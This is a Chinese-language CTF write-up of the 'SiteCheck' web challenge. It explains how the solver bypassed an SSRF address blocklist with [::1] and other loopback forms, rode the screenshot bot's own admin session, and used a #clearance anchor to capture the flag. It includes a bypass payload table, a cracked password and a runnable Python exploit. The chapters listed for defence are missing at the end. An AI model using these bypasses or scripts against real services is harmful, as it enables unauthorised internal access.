# SiteCheck — SSRF 地址过滤器绕过 + Bot 会话宿主绑定 + 视口锚点 完整 Writeup

> CTF: SunshineCTF 2026 (SunshineCTF / BSides Orlando) | 难度: 动态分 467 | 题目名: SiteCheck
>
> 题目来源: `https://spaceship.web.2026.sunshinectf.games/`
>
> Flag: `sun{fr4gm3nt3d_r3fl3ct10ns_1n_th3_futur3}`

**题目分类：Web 安全**。本题考察的是 **地址过滤器绕过的 SSRF** + **无头浏览器 Bot 的会话与主机绑定** + **视口截图与 URL 锚点的组合利用**。

核心思路可以用一句话概括：**让侦察无人机用"它自己"的高权限会话去截"它自己"的档案页，再用 URL 锚点把藏在截图折叠线以下的 flag 区拉进画面。**

（分析时间：2026-09-27 至 09-29。比赛于 09-28 14:00 UTC 闭幕时本题尚未解出；赛后实例仍存活，最终解出与复现均在存活实例上完成，全部结论来自黑盒实测。）

## 目录

- [第一章：前置知识](#第一章前置知识)
- [第二章：题目与环境分析](#第二章题目与环境分析)
- [第三章：基线测绘，找到目标](#第三章基线测绘找到目标)
- [第四章：绕过地址过滤器，打通 SSRF 入口](#第四章绕过地址过滤器打通-ssrf-入口)
- [第五章：一次高成本的弯路（与本题无关的凭据路线）](#第五章一次高成本的弯路与本题无关的凭据路线)
- [第六章：关键转折，无人机自己的会话](#第六章关键转折无人机自己的会话)
- [第七章：锚点，把 CLASSIFIED 区拉进快照](#第七章锚点把-classified-区拉进快照)
- [第八章：完整攻击复现（从零到 flag）](#第八章完整攻击复现从零到-flag)
- [第九章：如何防御](#第九章如何防御)
- [第十章：总结](#第十章总结)

---

## 第一章：前置知识

这一章把解题要用到的五个背景概念讲清楚：SSRF、截图机器人、Cookie 的主机隔离、IPv6 环回地址 `[::1]`、视口截图与 URL 锚点。

### 1.1 SSRF：让服务器替你去访问

SSRF（Server-Side Request Forgery，服务端请求伪造）指的是：应用提供一个"由服务端去访问某个地址"的功能，攻击者控制这个地址，就能让服务器去访问攻击者本来到不了的地方（内网服务、本机端口等）。

一个最小的 SSRF 示例：网页提供一个"图片抓取"接口，参数是图片 URL：

```
POST /fetch
image_url=https://example.com/a.png
```

如果服务端直接对 `image_url` 发起请求，把参数换成 `http://127.0.0.1:8080/admin`，请求就变成"从服务器自己内部"发出去的，于是可以访问只监听在本机的管理接口。

**本题的 SSRF 形态**：提交任意 http(s) 地址，服务器端的"侦察无人机"（一个无头浏览器）会去访问它。所以本题的 SSRF 不是"发一个请求"，而是"让一个真实浏览器去打开一个页面"。

为了防 SSRF，开发者常用"内网地址黑名单"，例如拦截 `127.0.0.1`、`localhost`、`0.0.0.0`。但黑名单如果只做**字符串匹配**，就会漏掉大量"等价写法"。下面这张表是历年被漏的经典形态：

| 等价写法 | 释义 | 朴素黑名单是否常漏 |
|---|---|---|
| `127.0.0.1` | IPv4 环回 | 通常拦 |
| `127.1` / `127.0.0.2` / `127.255.255.254` | 环回段内的其它写法/地址 | 常漏（本题实测：短写 `127.1` 被识破，段内其它地址漏；见 4.2） |
| `2130706433` / `0x7f000001` / `0177.0.0.1` | 十进制/十六进制/八进制 IP | 常漏 |
| `localhost` | 主机名 | 通常拦 |
| `localhost.`（尾部一个点） | 绝对形式主机名（FQDN 写法），解析结果相同 | **本题实测放行** |
| `LOCALHOST.` 等大小写变体 | 主机名大小写不敏感 | 常漏 |
| `[::1]` | IPv6 环回字面量 | **本题实测放行（最终解的关键）** |
| `[::ffff:127.0.0.1]` | IPv4 映射的 IPv6 写法 | 常漏 |
| `[0:0:0:0:0:0:0:1]` | IPv6 环回的完整展开 | 常漏 |

因此遇到"内网/本地地址被拦"，第一反应应是：**把目标地址的所有等价形态列一遍，再逐一试**（第四章完整演示）。

### 1.2 截图机器人：一个"带着自己身份"的浏览器

很多 Web 题会部署一个"机器人"（bot）：你提交一个 URL，服务器用一个无头浏览器（Chromium / Puppeteer / Playwright）去打开它、截图或执行页面脚本。

对攻击者，机器人有三个关键事实：

1. 它是真实浏览器：会执行 JS、会处理重定向、会滚动页面、会加载子资源。
2. 它可能有自己的身份：很多机器人**自带登录态**（用它自己的账号登录着目标站点），"让机器人替我做事"类题目的核心就在这里。
3. 它的视角与你不同：它的网络位置、持有的 Cookie、浏览器配置都可能和你不一样。同一个 URL，"你打开"和"机器人打开"看到的可能是两个完全不同的页面。

本题的机器人叫"侦察无人机"（inspection drone）：你提交地址，它飞过去、计时、统计资源、回传一张截图。**它自己是不是登录着？以什么身份登录着？** 这是本题的题眼（第六章揭晓）。

### 1.3 Cookie 按主机隔离

浏览器的 Cookie 按**主机名（host）隔离**：在 A 主机上写入的 Cookie，访问 B 主机时不会带上，即使这两个主机名解析到同一个 IP。

```http
# 在 localhost.:3000 上登录后，浏览器存下：
Set-Cookie: sc_session=xxxx; Path=/; HttpOnly; SameSite=Lax

# 之后请求 http://localhost.:3000/profile   -> 带上 Cookie（已登录视角）
# 但请求 http://[::1]:3000/profile          -> 不带（它是另一个 host）
# 以及请求 http://127.0.0.1:3000/profile     -> 同样不带
```

常见等价但**互相隔离**的主机形态：

| 形态 | 是否与其它形态共享 Cookie |
|---|---|
| `localhost` | 独立 |
| `localhost.`（尾点） | 独立 |
| `127.0.0.1` | 独立 |
| `[::1]` | 独立 |
| `web`（容器服务名） | 独立 |

这条隔离规则是第一个"坑"：**换主机形态就等于换了一套 Cookie 罐**。第六章的对照实验正是靠它成立的。

### 1.4 IPv6 环回地址 `[::1]`

`[::1]` 是 IPv6 的环回地址（表示"本机"），相当于 IPv4 的 `127.0.0.1`。两点注意：

1. `::1` 展开写是 `0:0:0:0:0:0:0:1`，两者完全等价。
2. 在 URL 里，IPv6 地址**必须用方括号包裹**，例如 `http://[::1]:3000/`。方括号是 URL 语法要求（IPv6 地址内部本身用冒号分隔，不加方括号无法与端口号区分），不是地址的一部分。

对开发者而言，`127.0.0.1`、`localhost`、`[::1]`、`[::ffff:127.0.0.1]` 是**同一个地方**；对只做字符串匹配的黑名单而言，它们是**四个不同的字符串**。这个错位就是第四章的入口。

### 1.5 视口截图与 URL 片段锚点

无头浏览器的截图有两种：**整页截图**（full page，把整个页面从上到下拼成一张长图）和**视口截图**（viewport，只截浏览器窗口那一屏，例如 1280×800）。

本题的无人机回传的是**视口截图**（约 800px 高的窗口），所以：**页面往下滚动之后的内容，截图里是没有的**。

控制"浏览器滚动到哪"的东西是 URL 的**片段（fragment）**，即 `#` 后面的部分：

```
http://example.com/page#section2
                             ^^^^^^^^ 片段：浏览器打开后会自动滚动到 id="section2" 的元素
```

片段有两个特点：

1. **只由浏览器内部处理，不会发给服务器**（HTTP 请求里看不到它）。
2. 页面里任何 `id="xxx"` 的元素都可以用 `#xxx` 直达。

合起来：如果关键信息藏在长页面深处（截图折叠线以下），可以用 `#锚点` 让浏览器"打开即滚动到那里"，从而**让视口截图恰好拍中它**。这是第七章的手法。

> **本章小结**：目标是"内网/本机"的 SSRF，入口是"等价地址形态"的过滤器绕过，机器人是携带身份的浏览器，Cookie 按主机隔离，视口截图可以用 URL 锚点定位。五个概念到第六、七章会全部串起来。

---

## 第二章：题目与环境分析

这一章明确题目要什么（目标），并测绘站点的结构与权限体系。

### 2.1 题面

原文：

```
Welcome to SiteCheck, the SkyCity fleet's favorite web-diagnostics service since 2062!

Enlist for a free inspector account and put any website through its paces: our
autonomous inspection drone flies out to the address you provide, clocks how long
the page takes to load, tallies how many files it pulls down, and beams back a
crisp viewport snapshot — all without you lifting a finger.

Kick the tires on the future of web monitoring.

The drone politely refuses to inspect internal or local addresses. Safety first!

https://spaceship.web.2026.sunshinectf.games
```

题面给足三个信息：① 有免费注册入口（"Enlist for a free inspector account"）；② 无人机回传的是**视口截图**（"crisp viewport snapshot"）；③ 无人机"礼貌地拒绝"访问内网/本地地址（"politely refuses to inspect internal or local addresses"），这等于在提示"内网地址是被过滤的重点"，反过来说，**过滤器的绕过就是本题的入口**。

### 2.2 站点结构与功能

实测路由清单：

| 路径 | 方法 | 说明 | 需登录 |
|---|---|---|---|
| `/` | GET | 首页（营销页，含注册/登录入口） | 否 |
| `/register` | GET/POST | 注册。字段：`username`（Callsign，3-24 位 `[A-Za-z0-9_-]`）、`password`。按钮文案 "Request Clearance ▸" | 否 |
| `/login` | GET/POST | 登录。 | 否 |
| `/logout` | POST | 登出。 | 是 |
| `/dashboard` | GET | 控制台（Diagnostics Console）。一个提交 URL 的表单（字段 `url`），按钮 "Run SiteCheck ▸" | 是 |
| `/scan` | POST | 提交扫描：`url=...`。处理完成后跳转结果页 | 是 |
| `/result/<uuid>` | GET | 扫描结果（状态/耗时/资源统计/截图引用） | 是 |
| `/screenshots/<uuid>.png` | GET | 无人机拍摄的视口截图（1280×800） | 是（按归属校验） |
| `/profile` | GET | 个人档案（Personnel File） | 是 |

技术栈：Express（Node.js）+ nginx 前置；静态样式 `/static/style.css`；主题是"轨道空间站舰队"的复古未来风（文案自称 "SiteCheck Orbital Diagnostics, EST. 2062"，页脚 "© 2062 Spacely Web Sprockets, Inc."）。

正常功能流：注册任意账号 → 登录 → 控制台提交一个 URL → 无人机飞出去截图 → 结果页展示截图 → 用户下载截图。

### 2.3 权限体系与目标锁定

新注册账号打开 `/profile`，实测响应片段：

```html
<div class="kicker">SITECHECK PERSONNEL FILE</div>
<h1 class="display">Inspector: insp87163</h1>
<p class="lede">Junior Inspector · Clearance <b>BRONZE</b></p>
...
<section id="clearance" class="dossier classified">
  <h2>◈ Clearance Data <span class="stamp">CLASSIFIED</span></h2>
  <p>Restricted personnel token — visible only to holders of this file:</p>
  <div class="flag-plate">REDACTED · insufficient clearance</div>
```

要点：

1. 每个账号有一份档案，档案含三个区块：`overview` / `service-record` / `clearance`。
2. `clearance` 区写着 "Restricted personnel token"（受限人员令牌），等级不足时显示 `REDACTED · insufficient clearance`。
3. 新账号等级固定为 `BRONZE`；设计上存在更高等级（后文实测见到了 `OMEGA`）。

**目标形态锁定**：flag 在某个"等级足够（sufficient clearance）"的账号档案里；而无人机能把任意页面拍成快照。把二者连起来就是终点线：**让无人机带着一个高权限会话，去截它自己的 `/profile`**。第三章从页面源码里找到支持这个判断的更多证据。

---

## 第三章：基线测绘，找到目标

这一章走一遍正常流程，从页面源码里找到"终点线在哪"的直接证据。

### 3.1 走一遍正常流程

**注册**（成功时 302 跳转 `/dashboard`；用户名被占用时页面返回 400 与一句 `That callsign is already taken.`，这个细节后文会用到）：

```bash
curl -s -c jar.txt -o /dev/null -w "%{http_code}\n" \
  -X POST https://spaceship.web.2026.sunshinectf.games/register \
  -d "username=insp00001" -d "password=Passw0rd!2345"
# -> 302
```

**登录并提交一次扫描**（提交 `https://example.com`）：

```bash
curl -s -b jar.txt -c jar.txt -o /dev/null -w "%{http_code}\n" \
  -X POST https://spaceship.web.2026.sunshinectf.games/login \
  -d "username=insp00001" -d "password=Passw0rd!2345"
# -> 302

curl -s -b jar.txt -L \
  https://spaceship.web.2026.sunshinectf.games/scan \
  -d "url=https://example.com"
# -> 结果页 HTML，内含截图引用（-d 已隐含 POST；不要加 -X POST，否则 302 后仍以 POST 请求结果页会 404）
```

结果页里包含一张截图引用，形如：

```html
<img src="/screenshots/219395ab-6535-4f1d-897f-e156119625dd.png" ...>
```

把截图下载下来（实测 18,816 字节 PNG），能看到无人机拍摄的 example.com 首页画面。到这里，"无人机能替我们打开任意页面并截图"这个能力已经被完整验证。

### 3.2 从样式表里读出设计意图

无人机拍到的只是画面，但页面的源代码（HTML / CSS）会暴露设计者的意图。抓取站点的样式文件：

```bash
curl -s https://spaceship.web.2026.sunshinectf.games/static/style.css
```

在 `/static/style.css` 里发现两条关键注释（原文）：

```css
/* instant anchor jumps: keeps the drone snapshot deterministic */
/* Spacers push the classified section well below the 800px snapshot fold. */
```

翻译成人话：

1. **"instant anchor jumps: keeps the drone snapshot deterministic"**（"锚点即时跳转：让无人机快照保持确定性"）：设计者明确把"URL 锚点跳转"当作无人机截图流程的一部分；用锚点可以让快照的落点**可预测**。
2. **"Spacers push the classified section well below the 800px snapshot fold"**（"撑高元素把机密区推到 800px 快照折叠线以下"）：截图窗口约 800px 高；档案页里的 `clearance`（机密）区被**故意**推到折叠线以下。

这两个注释等于把答案的形状画出来了：

```
最终画面 = 无人机 + 高权限会话 + /profile 页面 + #clearance 锚点
           （机器人）  （缺这个）    （目标页）      （滚动定位）
```

第三条辅助证据在档案页 HTML 里：`clearance` 区前面后各塞了 `.spacer` 撑高元素（如页面底部有一个 `<div class="spacer" style="height:1400px">`），让机密区在视觉上"沉底"。**要让视口截图拍中它，必须让浏览器先滚动过去**，而滚动的最省事方式就是 URL 锚点。

### 3.3 机制验证：缺的只是一个"高权限会话"

为了确认判断（"终点=无人机截特权档案"），我们先做了正向验证：构造一条链条，让无人机**用我们自己的账号**登录后去截 `/profile#clearance`（细节：在无人机打开的页面里弹出一个窗口、用表单 POST 到目标站点的 `/login` 完成顺位登录，再顶层导航到 `/profile#clearance`）。结果：截出来的确实是我们自己的档案页，`clearance` 区的画面是：

```
REDACTED · insufficient clearance
```

也就是说：**截图的时机控制、锚点定位、会话注入这些"机制"全部可行，唯一的缺口是"权限"**。新注册账号是 `BRONZE`，而 flag 需要"等级足够"的账号。那么问题归结为一个：**谁的会话能让无人机用？** 这个问题先放一放，第四章先把"让无人机访问内网地址"这道门打开。

---

## 第四章：绕过地址过滤器，打通 SSRF 入口

这一章把"内网/本地地址被拦"这件事拆开：先测绘过滤器的行为，再用等价形态把它绕过去，最后用无人机对内网做一次地图测绘。

### 4.1 过滤器的三种报错

分别提交非法 URL、非 http(s) 协议、以及内网地址，实测得到三种不同的错误提示（原文）：

```
That does not look like a valid URL.                     （非法 URL）
Only http:// and https:// targets are supported.          （协议白名单）
For safety, SiteCheck will not inspect internal or local addresses.   （内网拦截）
```

三种提示共用同一套"检查顺序"，其中第三句说明过滤器确实存在。下一步是看它**怎么判断**"internal or local"。

### 4.2 地址形态矩阵：黑名单的边界

把同一个目标（本机 3000 端口上的应用）写成不同形态逐一提测，结果分两组。

**被拦截的形态**：

| 提交的 URL | 结果 |
|---|---|
| `http://127.0.0.1:3000/` | 拦截（For safety...） |
| `http://127.1:3000/`（短写） | 拦截 |
| `http://0x7f000001:3000/`（十六进制） | 拦截 |
| `http://2130706433:3000/`（十进制） | 拦截 |
| `http://0177.0.0.1:3000/`（八进制） | 拦截 |
| `http://0.0.0.0:3000/` | 拦截 |
| `http://localhost:3000/` / `http://LOCALHOST:3000/` | 拦截（主机名大小写不敏感） |
| `http://example.com:80@127.0.0.1:3000/`（userinfo 混淆） | 拦截 |

**被放行的形态**：

| 提交的 URL | 结果 |
|---|---|
| `http://localhost.:3000/`（尾部加点） | **放行，无人机成功访问应用** |
| `http://LocalHost.:3000/`（尾点 + 大小写） | 放行 |
| `http://[::1]:3000/`（IPv6 环回） | **放行** |
| `http://[::ffff:127.0.0.1]:3000/`（IPv4 映射写法） | 放行 |
| `http://[0:0:0:0:0:0:0:1]:3000/`（IPv6 完整展开） | 放行 |
| `http://[::]:3000/`（IPv6 未指定地址） | 放行 |
| `http://127.0.0.2:3000/`、`http://127.255.255.254:3000/`（127/8 段内其它地址） | 放行 |
| `https://example.com/@localhost/` | 放行（`localhost` 出现在路径里，不参与判断） |

结论：这是一个**做过部分归一化的值级黑名单**：`127.0.0.1` 的常见数字编码（短写、十六进制、十进制、八进制）都会被识破，`localhost` 主机名大小写不敏感；但它**不做域名解析（拿到域名直接放过）、不剥尾点、不归一化 IPv6、不按网段判断**。漏网面 = 尾点主机名 / IPv6 字面量 / 127/8 段内其它地址；其中 `[::1]`（IPv6 环回）最终成为本题解法的关键形态。

（以上为**实测**矩阵，由无人机实际飞行的结果判定，而不是从代码反推的实现细节。）

### 4.3 用无人机测绘内网

有了放行形态，无人机就可以访问"只有服务器自己才能到"的地址。测得的网络地图（摘要）：

| 地址 | 结果 |
|---|---|
| `localhost.:3000` / `[::1]:3000` / `web:3000` | 应用本身（SiteCheck） |
| `172.17.0.1:80` / `443` | 有服务监听（返回空/证书响应） |
| `172.17.0.1:8000` | 一个 HTTP 服务（返回 403 白名单模式的 JSON API） |
| `172.17.0.1:8025` | nginx + Basic Auth（返回 401） |
| `127.0.0.1` 全端口扫描 | 只开放 3000（应用） |

到这里，"SSRF 入口"完全打开。**但请注意**：内网里这些额外服务（8000/8025 等）消耗了我们大量时间去深挖，最终证明它们属于本次比赛的**另一道题**的资产，与 SiteCheck 的解法无关。这段弯路完整记录在第五章，目的只有一个：让读者少走一次。

### 4.4 链的尽头：机制全通，只缺权限

把第四章的入口与第三章的终点拼起来：现在我们可以让无人机访问任何本机地址（含 `/profile`），会话注入机制也已验证（3.3 节）。但用自有账号截出来的档案永远是 `BRONZE` + `REDACTED`。

同时，应用代码层的其余尝试也全部关闭（摘要有代表性的几类）：

| 尝试方向 | 结果 |
|---|---|
| 注册/扫描字段的批量赋值（mass assignment，百来个字段名） | 全部无效，等级不变 |
| Cookie 伪造、签名剥离、畸形会话 | 一律 302 回登录页 |
| 路径穿越、模板注入、NoSQL 操作符、原型污染 | 无任何回显/行为变化 |
| 跨用户对象引用（他人 `/result/<uuid>`、`/screenshots/<uuid>.png`） | 404 / 403，有归属校验 |
| 隐藏路由与参数 fuzz（数千条） | 无可达的特权面 |

> **转折判断**：应用本身没有"提权按钮"。那么只剩一种可能：**这个系统里天然存在一个高权限身份，问题是"它的会话在谁手里"**。第六章回答这个问题。

---

## 第五章：一次高成本的弯路（与本题无关的凭据路线）

这一章完整记录一次高成本的误入：我们曾经追着一条"凭据路线"跑了很久，最终证明它与本题无关。放在这里是因为它是本次分析里最大的时间消耗点，值得读者引以为戒。

### 5.1 缘起：内网里的向量数据库

第四章测绘内网时，`172.17.0.1:8000` 上有一个 HTTP 服务，它是个按白名单转发请求的代理（只放行 `heartbeat`、`version`、`tenants`、`databases`、`collections` 等只读路由），背后是一个向量数据库（ChromaDB）。无人机可以访问它的白名单路由，于是我们读到了其中一个集合（collection）的元数据：

```
集合名: VecNetDB
集合 id: 455b419b-9668-4e7e-9f44-7ed62396f184
条目:
  user_password_requirements   (只有 embedding，无明文)
  user_hash_sha256             (明文: d8dd241199d2617765d7613fdd1df5358297b55f258647fe463de586bbfe3ebf)
  magic_string                 (明文: sunshinectf8_)
```

字面意思很诱人："某个用户"的密码要求、密码的 SHA-256、以及一个"魔法字符串"。看起来只要把密码反推出来，就能登录某个高权限账号。 

### 5.2 反演 embedding 与"密码推导"

`user_password_requirements` 只存了向量（embedding），没有原文。我们使用 embedding 反演工具（vec2text 一类的方法：训练模型把向量"翻译"回文本）把要求还原出来，得到：

```
The user's first and last initials, three special characters, followed by the magic string.
```

翻译："用户姓名的首末字母 + 三个特殊字符 + 魔法字符串"。按这个模板推导并对照库里的 SHA-256 逐一校验，得到了一个**哈希匹配的密码**：

```
GR$*#sunshinectf8_
```

（推导值 `GR$*#sunshinectf8_` 计算 SHA-256 后与库中的 `d8dd...3ebf` 完全一致，密码本身是"真"的。）

### 5.3 全灭：密码在所有入口都无效

问题来了：这个密码**没有对应的用户名**。我们在 SiteCheck 上枚举出的全部保留账号（几十个系统名）逐一试登，全部 401；随后扩展成"密码变体 × 用户名变体"的定向尝试，累计上万次，依然全部失败。

### 5.4 结论与教训

最终判断（属合理推断）：这个向量库属于本次比赛**另一道题**的内部组件（推断两题环境共享一台 Docker 主机的网络，才被无人机"顺路"访问到）。**本题的解法完全不需要密码**，第六章、第七章的最终路径与它没有任何关系。

> **核心教训**：长链题目里要区分"这道题的证据"和"路过的基础设施"。当一个凭据在所有可能的入口都无效、当目标的形状（本题的 flag 在"某账号的档案截图"里）根本不需要登录凭据时，它大概率不属于本题。判断捷径：**先想清楚"终点需要什么"，再决定"要不要为半路捡到的东西花时间"**。

---

## 第六章：关键转折，无人机自己的会话

这一章是整题的转折点：我们发现无人机**自带一个高权限会话**，并且这个会话绑定在一个此前完全没被当作变量的东西上：**主机形态**。

### 6.1 提出假设：无人机自己登录着吗？

第四章结束时我们面对的局面是：机制全通、只缺权限。此时重新审视一个被忽略的细节：第四章扫描内网时，无人机访问 `http://localhost.:3000/` 看到的是**未登录视角**。但我们从来没有检验过一个假设：

> **如果无人机自己就是一个登录用户呢？**（Bot 题里机器人以自己身份访问页面是常见设定。）

而且就算它登录着，还有一个更隐蔽的问题：**登录态是按主机形态存放的**（回顾 1.3 节）。无人机浏览器里的会话 Cookie，是针对哪一个主机名写入的？

这里有一段值得记下的插曲：更早我们其实做过一次"主机形态矩阵"（`localhost` / `127.0.0.1` / `[::1]` / `web` 四种形态各测一遍），但那次全部经**外部跳转服务包装**提交（`https://httpbin.org/redirect-to?url=...`），四种形态全落登录页，于是"无人机没有会话"被误判并固化。真正有效的对照必须**直接提交**目标 URL（复现要点见 6.2 表下的警示）。

### 6.2 宿主形态对照实验（决定性实验）

设计一个"控制变量"实验：**路径固定为 `/profile`，只改变主机形态**，逐一提交给无人机，对比它看到的页面：

| 提交的 URL | 无人机看到的页面 | 返回截图大小（指纹） |
|---|---|---|
| `http://localhost.:3000/profile` | 登录页（未登录） | 320,086 B |
| `http://web:3000/profile` | 登录页（未登录） | 320,086 B |
| `http://[::1]:3000/profile` | **一个已登录的档案页（非登录页！）** | **261,639 B** |

> **复现警示（实测）**：上面三个对照必须**直接提交**目标 URL。如果把同一个 `http://[::1]:3000/profile` 经外部跳转服务（如 `https://httpbin.org/redirect-to?url=...`）302 包装后提交，无人机截到的是登录页（320,086 字节），会话不生效；直接提交才截到 admin 档案（261,639 字节）。该差异在存活实例上稳定可复现，成因未完全查清（可能与跳转链的浏览上下文或同站判定有关）。做机器人会话类实验时，不要用重定向包装去测试，否则会得到假阴性。

第三个结果就是突破口。把这张截图放大看（OCR 转写，原文）：

```
SITECHECK PERSONNEL FILE
Inspector: admin
Chief Inspection Drone - Clearance OMEGA

FILE INDEX   overview  service-record  clearance

Overview
Automated SiteCheck agent. Executes every diagnostic on behalf of the fleet.
```

**无人机自己的账号就是 `admin`，头衔"首席侦察无人机"，许可等级 `OMEGA`。** 因为它的会话 Cookie 是针对 `[::1]` 这个主机形态写入的，所以只有通过 `[::1]` 打开页面时，它才"带上身份"；换成 `localhost.` 或 `web:3000`，浏览器没有那张 Cookie，就落回登录页。

### 6.3 为什么是 `[::1]`

事后理解非常自然：无人机的登录会话是在它自己的运行环境里建立的，会话 Cookie 落到它访问应用时使用的那个主机形态上（本题就是 IPv6 环回 `[::1]`）；浏览器的 Cookie 隔离规则保证它不会"泄漏"给其它形态。对攻击者而言，`[::1]` 既是第四章的**过滤器绕过形态**，也是第六章的**会话唤醒形态**，同一个字符串同时解决两个问题，这是本题最精妙的设计点。

### 6.4 教训

> **核心发现**：同一个路径，换一个主机形态提交，机器人就换了一个身份。

我们此前把路径、参数、字段、方法都当成过变量；更早的矩阵实验虽然覆盖了"主机形态"（`localhost.` / `127.0.0.1` / `[::1]` / 服务名 / 大小写 / 尾点），却因为用重定向包装提交而得到假阴性。教训是双重的：① "请求上下文"本身是变量（主机形态、会话绑定在哪个形态上）；② **测试方法也是变量**（直接提交与重定向包装可以让结果完全不同）。以后遇到"机器人有会话但拿不到"的题，先做直接提交的对照实验。

---

## 第七章：锚点，把 CLASSIFIED 区拉进快照

这一章完成最后一步：让无人机滚到机密区，把 flag 拍进画面。

### 7.1 差最后一步：机密区在折叠线下方

第六章那张 `http://[::1]:3000/profile` 的截图（261,639 字节）拍到的是档案页**顶部**：标题区与 Overview 区。但 `clearance`（机密）区不在画面里，因为这正是设计者用撑高元素把它推下去的地方（回顾 3.2 节的 CSS 注释："Spacers push the classified section well below the 800px snapshot fold"）。

档案页的三个区块 id 在 HTML 里写得清清楚楚：

```html
<a href="#overview">overview</a>
<a href="#service-record">service-record</a>
<a href="#clearance">clearance</a>
```

于是让浏览器"打开即滚动"的方式就是把片段锚点拼到 URL 末尾。

### 7.2 加上 `#clearance` 锚点

提交：

```
http://[::1]:3000/profile#clearance
```

下载这次回传的截图（202,279 字节），画面内容（关键行）：

```
区块标题:  ◈ Clearance Data  [CLASSIFIED]
令牌行:    sun{fr4gm3nt3d_r3fl3ct10ns_1n_th3_futur3}
```

拿到 flag：

```
sun{fr4gm3nt3d_r3fl3ct10ns_1n_th3_futur3}
```

对照 7.1 的截图：两次截图**路径相同、主机相同、账号相同**，唯一区别就是 URL 末尾的 `#clearance`。加了锚点之后，浏览器在渲染时自动滚动到机密区，800px 的视口截图正好把 flag 方块拍全。

### 7.3 验证：为什么不能只看一眼

截图里的 flag 是像素文字，最终结论要经过交叉验证，防止任何一层识别环节出错（OCR 对 `sun{...}` 这种数字字母混排字符串有幻觉风险）。实际做了三方对照：

1. OCR 工具第一次转写；
2. 换提示词、独立第二次 OCR 转写；
3. 人工直接读图核对。

三方输出一致，截图原文件留存（202,279 字节的 PNG）。此外，两次截图的**文件大小**本身就是很好的辅助证据：261,639（顶部画面）与 202,279（机密区画面）明显不同，说明滚动确实发生过；同类页面的尺寸指纹（登录页 320,086、注册页 318,533）也可用来快速判断"无人机看到的是哪一页"。

### 7.4 回望：这一手有多"轻"

最终解法没有用到密码（第五章的弯路）、没有用到内网其它服务、没有任何注入或伪造。全部要素只有三个，而且全部来自题目自身的设计：

| 要素 | 作用 |
|---|---|
| `[::1]`（IPv6 环回字面量） | 绕过地址过滤器；同时是唤醒无人机会话的主机形态 |
| 无人机自带的 `admin`（OMEGA）会话 | 提供"等级足够"的身份 |
| `#clearance` 锚点 | 把机密区滚进 800px 视口截图 |

这也是为什么这类"截图机器人"题值得反复练：它的每一个设计元素（过滤、会话、截图）单独看都不复杂，组合起来才形成一条完整的链。

---

## 第八章：完整攻击复现（从零到 flag）

这一章给出从零到 flag 的完整复现步骤与可直接运行的脚本。

### 8.1 前置条件

- 目标实例可访问：`https://spaceship.web.2026.sunshinectf.games/`（本题在赛后一段时间内实例仍存活，以下命令均在该实例上实测通过）。
- Python 3 环境 + `requests` 库：

```bash
python3 -m pip install requests
```

### 8.2 手工复现（curl 版）

```bash
BASE="https://spaceship.web.2026.sunshinectf.games"

# 1) 注册任意免费账号（用户名被占用时换成别的即可）
curl -s -c jar.txt -o /dev/null -w "register: %{http_code}\n" \
  -X POST "$BASE/register" -d "username=insp00001" -d "password=Passw0rd!2345"

# 2) 登录（302 表示成功）
curl -s -b jar.txt -c jar.txt -o /dev/null -w "login: %{http_code}\n" \
  -X POST "$BASE/login" -d "username=insp00001" -d "password=Passw0rd!2345"

# 3) 提交扫描：注意 URL 里的两个要害（[::1] 与 #clearance）
#    不要加 -X POST：它会让 curl 跟随 302 时仍以 POST 请求结果页（结果页只收 GET，会 404）
curl -s -b jar.txt -L "$BASE/scan" \
  -d "url=http://[::1]:3000/profile#clearance"

# 4) 在结果页 HTML 里找到 /screenshots/<uuid>.png，然后下载
curl -s -b jar.txt -o flag.png "$BASE/screenshots/<uuid>.png"

# 5) 打开 flag.png，Clearance Data 区即 flag
```

### 8.3 完整 Exploit 脚本（Python，可直接运行）

```python
#!/usr/bin/env python3
"""SiteCheck exploit: 让无人机用自带 admin 会话截自己的档案页并定位 flag 区。

要点（与题解对应）:
  1. [::1]        -> 绕过地址过滤器（IPv6 环回字面量形态）
  2. admin 会话   -> 无人机浏览器自带，且绑定在 [::1] 主机形态上
  3. #clearance   -> 把 800px 视口滚到机密区（视口截图才会拍到 flag）
"""
import re
import sys
import time

import requests

BASE = "https://spaceship.web.2026.sunshinectf.games"
USER = "insp00001"          # 任意未被占用的名字
PASSWORD = "Passw0rd!2345"  # 任意密码


def main() -> None:
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})

    # 1) 注册（若名字被占用，服务端返回 400 + "That callsign is already taken."）
    r = s.post(BASE + "/register",
               data={"username": USER, "password": PASSWORD},
               allow_redirects=False, timeout=30)
    print("[1] register ->", r.status_code)
    if r.status_code == 400:
        sys.exit("[-] 用户名已被占用（That callsign is already taken.），修改脚本开头的 USER 后重跑")

    # 2) 登录（302 为成功）
    r = s.post(BASE + "/login",
               data={"username": USER, "password": PASSWORD},
               allow_redirects=False, timeout=30)
    print("[2] login    ->", r.status_code)

    # 3) 提交扫描：无人机带着它自己的 admin 会话打开自己的档案页
    r = s.post(BASE + "/scan",
               data={"url": "http://[::1]:3000/profile#clearance"},
               timeout=120)
    print("[3] scan     ->", r.status_code, "| result page:", len(r.text), "bytes")

    # 4) 从结果页解析截图地址（形如 /screenshots/<uuid>.png）
    m = re.search(r"/screenshots/([0-9a-f-]{36})\.png", r.text)
    if not m:
        sys.exit("[-] result page 里没有截图引用，检查扫描是否成功")
    shot_url = BASE + m.group(0)
    print("[4] screenshot:", shot_url)

    # 5) 下载截图（带重试，防生成略有延迟）
    for _ in range(10):
        img = s.get(shot_url, timeout=30)
        if img.status_code == 200 and len(img.content) > 1000:
            with open("flag.png", "wb") as f:
                f.write(img.content)
            print(f"[5] saved flag.png ({len(img.content)} bytes)")
            break
        time.sleep(3)
    else:
        sys.exit("[-] 截图未就绪，稍后重试")

    print("[*] 打开 flag.png：Clearance Data 区即 flag")


if __name__ == "__main__":
    main()
```

### 8.4 对照实验（验证结论）

想亲手感受"主机形态"这个变量，把第 3 步的 URL 换成下表逐一提交，对比无人机回传的截图：

| URL | 预期画面 |
|---|---|
| `http://[::1]:3000/profile#clearance` | admin 的 OMEGA 档案 + flag（本解） |
| `http://localhost.:3000/profile#clearance` | 登录页（浏览器没有该形态下的会话） |
| `http://web:3000/profile#clearance` | 登录页（同上） |
| `http://127.0.0.1:3000/profile#clearance` | 被过滤器拦截，无截图 |

### 8.5 常见问题

| 问题 | 说明 |
|---|---|
| 截图下载 404 | 扫描结果生成有极小延迟，脚本里已带重试；也可稍后再取 |
| 注册返回 400 | 用户名被占用（返回 `That callsign is already taken.`），换个名字 |
